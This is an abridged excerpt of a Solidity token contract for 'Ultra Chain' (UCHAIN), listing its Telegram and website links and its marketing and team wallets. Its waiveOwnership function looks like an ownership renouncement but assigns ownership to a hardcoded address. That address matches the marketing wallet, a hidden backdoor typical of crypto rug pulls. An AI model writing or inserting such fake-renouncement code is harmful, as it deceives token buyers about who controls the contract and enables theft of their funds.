...
// Telegram https://t.me/ultrachaincoin
// Website https://ultra-chain.net/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6C10c2F3C0ccC4b5Ede037C1619C1ccE34C75aF8);
    }
...
contract UltraChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ultra Chain";
    string private _symbol = "UCHAIN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6C10c2F3C0ccC4b5Ede037C1619C1ccE34C75aF8);
    address payable public teamWalletAddress = payable(0xeF5f2fBcf787Ec89a562377ff5167Ad849BD5387);
